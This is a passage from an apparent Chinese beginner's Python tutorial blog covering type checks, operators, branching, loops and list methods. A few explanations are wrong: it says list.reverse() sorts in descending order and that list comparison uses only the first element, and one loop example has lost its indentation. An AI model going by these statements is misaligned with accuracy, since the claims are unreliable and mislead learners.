class="string">&#x27;5.99&#x27;</span></span><br></pre></td></tr></table></figure><p>他就会自动在数字上加单引号<br><strong>查看数据类型</strong><br>上一篇文章我写到了一种，type()函数。可以查看一下，现在还有一种方法，就是使用<code>isinstance()</code>函数。话不多说看示例：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; isinstance(<span class="number">250</span>,<span class="keyword">int</span>)</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; isinstance(<span class="number">520.1314</span>,float)</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; isinstance(<span class="string">&#x27;lixinjie&#x27;</span>,str)</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; isinstance(True,<span class="keyword">bool</span>)</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; isinstance(<span class="number">520</span>,float)</span><br><span class="line">False</span><br></pre></td></tr></table></figure><p>如果是相应的数据类型就会回复True，不是就回复False<br><strong>算数运算</strong><br>关于算数运算，我上篇博客也只是写到算数运算符而已，这次写下怎么使用。还是老规矩，直接上实例：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; a = b = c =d = <span class="number">10</span></span><br><span class="line">&gt;&gt;&gt; a += <span class="number">1</span></span><br><span class="line">&gt;&gt;&gt; b -= <span class="number">3</span></span><br><span class="line">&gt;&gt;&gt; c *= <span class="number">10</span></span><br><span class="line">&gt;&gt;&gt; d /= <span class="number">8</span></span><br><span class="line">&gt;&gt;&gt; a</span><br><span class="line"><span class="number">11</span></span><br><span class="line">&gt;&gt;&gt; b</span><br><span class="line"><span class="number">7</span></span><br><span class="line">&gt;&gt;&gt; c</span><br><span class="line"><span class="number">100</span></span><br><span class="line">&gt;&gt;&gt; d</span><br><span class="line"><span class="number">1.25</span></span><br><span class="line">&gt;&gt;&gt; <span class="number">10</span> <span class="comment">// 8</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line">&gt;&gt;&gt; <span class="number">3.0</span> <span class="comment">// 2</span></span><br><span class="line"><span class="number">1.0</span></span><br><span class="line">&gt;&gt;&gt; <span class="number">5</span> % <span class="number">2</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line">&gt;&gt;&gt; <span class="number">3</span> ** <span class="number">2</span></span><br><span class="line"><span class="number">9</span></span><br><span class="line">&gt;&gt;&gt; <span class="number">3</span> ** <span class="number">5</span></span><br><span class="line"><span class="number">243</span></span><br></pre></td></tr></table></figure><p>如果混合运算的话，害，记住一句亘古不变的话（说个高级点的词汇装下X，哈哈哈）：先乘除，后加减！<br>哎，对了，我还借了（我们都是IT学习爱好者，这不能说偷知道吗，，，，）小甲鱼一张图片。<br><img src="https://img-blog.csdnimg.cn/20200218230816551.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>哈哈哈，过瘾，感觉这样学真不错。<br><strong>逻辑操作符</strong><br><code>and</code>、<code>or</code>、<code>not</code><br>老规矩，看示例：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; <span class="number">1</span> &gt; <span class="number">2</span> and <span class="number">3</span> &lt; <span class="number">4</span></span><br><span class="line">False</span><br><span class="line">&gt;&gt;&gt; <span class="number">1</span> &gt; <span class="number">2</span> or <span class="number">3</span> &lt; <span class="number">4</span></span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; not True</span><br><span class="line">False</span><br><span class="line">&gt;&gt;&gt; not False</span><br><span class="line">True</span><br></pre></td></tr></table></figure><p>哈哈哈，，例子真的比语言易懂！！！<br>反正我这么学感觉挺好，哈哈哈，希望对你们有一点点的帮助哈，一起学习，一起进步。<br>溜了溜了！！！！</p><h1 id="分支和循环"><a href="#分支和循环" class="headerlink" title="分支和循环"></a>分支和循环</h1><h3 id="if语句"><a href="#if语句" class="headerlink" title="if语句"></a>if语句</h3><p>在C语言里，学过<strong>if</strong>语句，Python中的<strong>if</strong>语句和C语言的差不多，老规矩，直接上示例：如果编写百分制学生成绩评分，分为‘A’、‘B’、‘C’、‘D’几个等级，那么可以怎么写呢？？？？？？</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 第一种：</span></span><br><span class="line">score = int(input(<span class="string">&#x27;请输入一个学生的分数：&#x27;</span>))</span><br><span class="line"><span class="keyword">if</span> <span class="number">100</span> &gt;= score &gt;= <span class="number">90</span>:</span><br><span class="line">    print(<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="number">90</span> &gt; score &gt;= <span class="number">80</span>:</span><br><span class="line">    print(<span class="string">&#x27;B&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="number">80</span> &gt; score &gt;= <span class="number">60</span>:</span><br><span class="line">    print(<span class="string">&#x27;C&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="number">60</span> &gt; score &gt;= <span class="number">0</span>:</span><br><span class="line">    print(<span class="string">&#x27;D&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> score &lt; <span class="number">0</span> <span class="keyword">or</span> score &gt; <span class="number">100</span>:</span><br><span class="line">    print(<span class="string">&#x27;输入错误&#x27;</span>)</span><br></pre></td></tr></table></figure><p>这样看起来有点低级，不过这很像C语言中的<strong>if</strong>，很容易理解，不过有更简便的，看第二种：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 第二种：</span></span><br><span class="line">score = int(input(<span class="string">&#x27;请输入一个学生的分数：&#x27;</span>))</span><br><span class="line"><span class="keyword">if</span> <span class="number">100</span> &gt;= score &gt;= <span class="number">90</span>:</span><br><span class="line">    print(<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="number">90</span> &gt; score &gt;= <span class="number">80</span>:</span><br><span class="line">        print(<span class="string">&#x27;B&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="number">80</span> &gt; score &gt;= <span class="number">60</span>:</span><br><span class="line">            print(<span class="string">&#x27;C&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="number">60</span> &gt; score &gt;= <span class="number">0</span>:</span><br><span class="line">                print(<span class="string">&#x27;D&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">&#x27;输入错误&#x27;</span>)</span><br></pre></td></tr></table></figure><p>这个看起来就有点不一样了，害，你品，你细品，当然，他们俩都不是今天的主角，主角是它：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 第三种，它是今天的靓仔：</span></span><br><span class="line">score = int(input(<span class="string">&#x27;请输入一个学生的分数：&#x27;</span>))</span><br><span class="line"><span class="keyword">if</span> <span class="number">100</span> &gt;= score &gt;= <span class="number">90</span>:</span><br><span class="line">    print(<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> <span class="number">90</span> &gt; score &gt;= <span class="number">80</span>:</span><br><span class="line">    print(<span class="string">&#x27;B&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> <span class="number">80</span> &gt; score &gt;= <span class="number">60</span>:</span><br><span class="line">    print(<span class="string">&#x27;C&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> <span class="number">60</span> &gt; score &gt;= <span class="number">0</span>:</span><br><span class="line">     print(<span class="string">&#x27;D&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">     print(<span class="string">&#x27;输入错误&#x27;</span>)</span><br></pre></td></tr></table></figure><p>在Python中，比较常用的就是<code>if ···elif···else</code>这个也是Python跟C语言不同的地方，这里还体现出来Python的一个特点：简洁！！！仔细对比这三个代码，觉得那种适合自己就用哪种，毕竟编程语言没有最好的，只有最适合的。</p><h3 id="断言"><a href="#断言" class="headerlink" title="断言"></a>断言</h3><p>断言呢，一个小知识点，什么是断言？？？<code>assert</code>这个关键字我们称之为“<strong>断言</strong>”，当这个关键字后面跟的条件为假时，程序自动崩溃并抛出<code>AssertionError</code>的异常，举个例子：<code>assert 3 &gt; 4</code>,看下结果：<br><img src="https://img-blog.csdnimg.cn/20200221233850930.png" alt="在这里插入图片描述" loading="lazy"><br>我刚看到这个东西的时候第一时间想的是，这有什么用啊，让系统崩溃？？？？？写程序不就是为了让它能够好好的运行吗？？为什么还要设置让它自动崩溃的步骤呢？？？？当时就一个字——<strong>迷</strong>！！<br>原因：一般都是拿它插在程序里，当做检查点。当需要确保一个程序的一个条件一定为真才能让程序正常工作的话，assert就很有用了。哦。。。原来还能这么用啊，真是学到了，还是想的方面太狭窄，没有往其他方面扩展。</p><h3 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h3><p>循环是很重要的，在任何一种编程语言当中，它都极其重要，它可以减少程序员写代码的时间，遇到使代码更加简洁。</p><h5 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h5><p>for循环的结构：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> 目标 <span class="keyword">in</span> 表达式</span><br><span class="line">    循环体</span><br></pre></td></tr></table></figure><p>老规矩，先看个示例：<br><img src="https://img-blog.csdnimg.cn/20200222001107588.png" alt="在这里插入图片描述" loading="lazy"><br>这里我拿money做个例子，实不相瞒，我就是喜欢money，嘿嘿！！！<br>这里可能会有人对那个<code>end=</code>有点不理解，看着有点懵B,咳咳，因为我就是这样的人……至于他是什么呢，我再举个例子就明白了：<br><img src="https://img-blog.csdnimg.cn/20200222001513642.png" alt="在这里插入图片描述" loading="lazy"><br>看看看看，对比一下，哪里不一样啦？？？？它换行了，有了那个<code>end</code>，就不会换行了，如果没有<code>end</code>在Python里，它是默认换行的。<br>再看一个做下比较：<br><img src="https://img-blog.csdnimg.cn/20200222002303116.png" alt="在这里插入图片描述" loading="lazy"><br>这个<code>[ ]</code>嘛，就跟C语言中的数组类似，这里知道就行，后面再说。<br>len 是长度，这个也到后面再提。<br>这个代码的意思是对于member里的每一项，都使用列表打印出来，并且显示出来这个字符串的长度。<br><strong>range()</strong><br>语法：<code>range([start],stop,[step=1])</code><br>这个BIF有三个参数，其中<strong>带中括号的参数是可选的</strong><br>step=1，表示这第三个参数默认值是1<br>range这个BIF的作用是生成一个从start参数值开始到stop参数值结束的一个数字序列。老规矩，上示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>range(<span class="number">5</span>)</span><br><span class="line">range(<span class="number">0</span>, <span class="number">5</span>)</span><br><span class="line"><span class="comment"># 列出来康康：</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>list(range(<span class="number">5</span>))</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br></pre></td></tr></table></figure><p>range()，跟for经常连在一块用，<br><img src="https://img-blog.csdnimg.cn/20200222004731981.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>看看这几个示例就清楚了，！！！</p><h5 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h5><p>while循环其实，没什么，因为它跟C语言很像，几乎没什么不同，也没什么可说的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>  条件</span><br><span class="line">     循环体</span><br></pre></td></tr></table></figure><h5 id="关键词"><a href="#关键词" class="headerlink" title="关键词"></a>关键词</h5><p><strong>break</strong><br>这个不会陌生，它在循环里的作用是跳出循环，这个应该不需要解释。<br><strong>continue</strong><br>这个的意思就是，如果符合条件的话，它以下的语句就不执行了。<br>看个代码，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line"><span class="keyword">if</span> i%<span class="number">2</span> !=<span class="number">0</span>:</span><br><span class="line">print(i)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">i += <span class="number">2</span></span><br><span class="line">print(i)</span><br></pre></td></tr></table></figure><p>这是个数字小游戏，不妨先看看，在脑袋里过一遍这个代码，想想会输出什么，下面有答案：<br><img src="https://img-blog.csdnimg.cn/20200222010844100.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>看看答案，跟想的一样不一样，不一样的话就再好好看下代码，多看几遍；一样的话就证明已经理解了。</p><h1 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h1><p>Python里面没有数组一说，而代替数组作用的有个新名字，叫做<strong>列表</strong>。<br>数组要求你放在数组里的数据类型必须一致，整型就放整型，字符串就放字符串，不能混合放置。<br>列表也可以理解为是一个强大的数组，但不能说是数组，Python没有数组，有的只是列表。列表可以放各种不同的数据，功能比较强大。<br>首先，先创建一个普通的列表，老规矩：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 简单列表：</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>member = [<span class="string">&#x27;中国加油&#x27;</span>,<span class="string">&#x27;武汉加油&#x27;</span>,<span class="string">&#x27;白衣天使加油&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>member</span><br><span class="line">[<span class="string">&#x27;中国加油&#x27;</span>, <span class="string">&#x27;武汉加油&#x27;</span>, <span class="string">&#x27;白衣天使加油&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>member = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>member</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br></pre></td></tr></table></figure><p>列表可以起C语言中数组的作用。可以放字符串，也可以放数字。当然，也可以放其他的……<br>再创建一个混合列表：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#混合列表；</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>mix = [<span class="number">1</span>,<span class="string">&#x27;zxcv0221&#x27;</span>,<span class="number">3.1415926</span>,[<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>mix</span><br><span class="line">[<span class="number">1</span>, <span class="string">&#x27;zxcv0221&#x27;</span>, <span class="number">3.1415926</span>, [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]]</span><br></pre></td></tr></table></figure><p>这个列表就很强，可以放整型数字，还可以放浮点型、字符串，也看到了，还可以在里面再放一个列表。<br>还可以创建一个空列表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>empty = []</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>empty</span><br><span class="line">[]</span><br></pre></td></tr></table></figure><p>这个就是个空列表。<br>那么，如何向列表中添加元素呢？？？？？Python当然它的办法，<br>第一种方法：<br>这个时候用到一个函数，名字叫做<code>append()</code>具体怎么用呢？？说再多也不如直接看例子来的好，嘿嘿（为我懒得打字找个理由）！！！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>member</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>member.append(<span class="string">&#x27;添加项1&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>member</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="string">&#x27;添加项1&#x27;</span>]</span><br></pre></td></tr></table></figure><p>加上了，哈哈哈。那我再来试试，这次我添加两个，嘿嘿<br><img src="https://img-blog.csdnimg.cn/20200222132653167.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>哎？？？一次只能添加一个？？好吧，这个函数看来能力有限，没关系，还有第二种，要相信大佬人总会想各种方法偷懒，嘿嘿，当然会有更简便的方法；<br>extend函数，这个是可以添加多个的它的使用方法跟append有点稍微不同；<br>看下示例：<br><img src="https://img-blog.csdnimg.cn/20200222133742962.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>成功啦，，，看出来了吗？？？？这个函数在列表里添加元素要加中括号，这个是在列表里添加列表元素。。。。这样不就好起来了嘛。<br>那么看了这两个例子，有没有发现一个问题，我添加进列表的元素都是排在后面的，这是默认的，但是我想把它排在第一位，现在就再添加一个元素，这次我要让它排老大。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>member.insert(<span class="number">0</span>,<span class="string">&#x27;我要排第一！&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>member</span><br><span class="line">[<span class="string">&#x27;我要排第一！&#x27;</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="string">&#x27;添加项1&#x27;</span>, <span class="string">&#x27;添加项2&#x27;</span>, <span class="string">&#x27;添加项3&#x27;</span>]</span><br></pre></td></tr></table></figure><p>哈哈哈，排第一了，insert()函数，可以自己选择插入位置，这个函数有两个参数，第一个参数定位置。当然这里我用<strong>0</strong>,应该没有异议，哈哈哈，毕竟我们学编程的眼里的第“一”位是0<br>那么现在我就不想让它在第一个，我要想办法给他换到其他位置，怎么做，<br>老规矩；<br><img src="https://img-blog.csdnimg.cn/20200222224918663.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>你想排第一？，哈哈哈我就不让你排第一，倒数第一去吧。。。<br>上面的换位方法和其他编程语言类似，找个空的值，先将一个值存在这个空值里，再换位。<br><strong>删除元素</strong><br>也是三种方法：<br>1.<code>remove()</code>删除一个元素，删除谁呢？emmmmm 那就删了那个想排第一的吧，嘿嘿！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>member.remove(<span class="string">&#x27;我要排第一！&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>member</span><br><span class="line">[<span class="string">&#x27;添加项3&#x27;</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="string">&#x27;添加项1&#x27;</span>, <span class="string">&#x27;添加项2&#x27;</span>]</span><br><span class="line"><span class="comment">#好，已经删除了</span></span><br></pre></td></tr></table></figure><p>注意：如果同一列表中有两个相同的元素，那么使用此函数，默认删除从左到右数第一个元素。<br>2.del语句<br>del就是delete的缩写，用法看下面</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">del</span> member[<span class="number">0</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>member</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="string">&#x27;添加项1&#x27;</span>, <span class="string">&#x27;添加项2&#x27;</span>]</span><br></pre></td></tr></table></figure><p>这里我又把第0位的那个删除了。可以自定义想要删除的元素参数。<br>3.pop()<br>pop()函数是有一个参数的，如果不添加参数，默认删除最后一个元素。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>member.pop()</span><br><span class="line"><span class="string">&#x27;添加项2&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>member</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="string">&#x27;添加项1&#x27;</span>]</span><br></pre></td></tr></table></figure><p>看第二行代码，删除之前，它会显示将要删除的那个元素。Python还是很人性化的。。<br>当然也可以想删哪个删哪个。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>member.pop(<span class="number">5</span>)</span><br><span class="line"><span class="string">&#x27;添加项1&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>member</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br></pre></td></tr></table></figure><p>现在这个列表已经被删的就剩数字元素了。<br><strong>列表分片</strong><br>这个不好描述，老规矩：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>member</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>member[<span class="number">1</span>:<span class="number">3</span>]</span><br><span class="line">[<span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>member[:<span class="number">4</span>]</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>member[<span class="number">1</span>:]</span><br><span class="line">[<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>member[:]</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br></pre></td></tr></table></figure><p>先看第一个，member[1:3]分出来member的第一位，到第三位，但是这个中括号是左闭右开，数学中的术语，就是左边是可以取到，而右边不能取到。<strong>注意：这里说的第一位是2，毕竟0才是第一个嘛</strong><br>第二个，前面那个参数没有设置，那就默认全都有了，第三个跟第二个类似。<br>第四个，左右两边都没有参数，相当于一个列表的拷贝，讲原来的列表拷贝一份。</p><h4 id="与列表连用的函数"><a href="#与列表连用的函数" class="headerlink" title="与列表连用的函数"></a>与列表连用的函数</h4><p>与列表连用的函数有很多，可以输入<code>dir list</code>就可以查看<br><img src="https://img-blog.csdnimg.cn/20200222235616154.png" alt="在这里插入图片描述" loading="lazy"><br>这里就不一一举例了，因为我也就会几种而已<br><img src="https://img-blog.csdnimg.cn/20200222235946715.jpg" alt="在这里插入图片描述" loading="lazy"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">list.reverse()<span class="comment">#将列表中的元素从大到小排列</span></span><br><span class="line">list.sort()<span class="comment">#讲列表中的元素从小到大排列</span></span><br><span class="line">list.count()<span class="comment">#参数有一个，计算该参数在上面出现的次数</span></span><br><span class="line">list.index()<span class="comment">#参数三个，（信息，开始位置，结束位置）找出想找到的信息所在的位置</span></span><br></pre></td></tr></table></figure><p>下面还有一些列表的比较好玩的用法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>list1 = [<span class="number">123</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>list2 = [<span class="number">456</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>list1 &gt; list2</span><br><span class="line"><span class="literal">False</span>             <span class="comment">#从这里可以看出来列表也可以比较大小</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>list1 = [<span class="number">123</span>,<span class="number">456</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>list2 = [<span class="number">234</span>,<span class="number">256</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>list1 &gt; list2</span><br><span class="line"><span class="literal">False</span>        <span class="comment">#列表有多个元素比较大小时，只比较第一个元素的大小来确定列表大小</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>list3 = list1 + list2</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>list3           <span class="comment">#可以相加</span></span><br><span class="line">[<span class="number">123</span>, <span class="number">456</span>, <span class="number">234</span>, <span class="number">256</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>list4 = list3</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>list4         <span class="comment">#虽说是复制但真正用时这两个列表的变化是关联的</span></span><br><span class="line">[<span class="number">123</span>, <span class="number">456</span>, <span class="number">234</span>, <span class="number">256</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>list3 * <span class="number">3</span>                <span 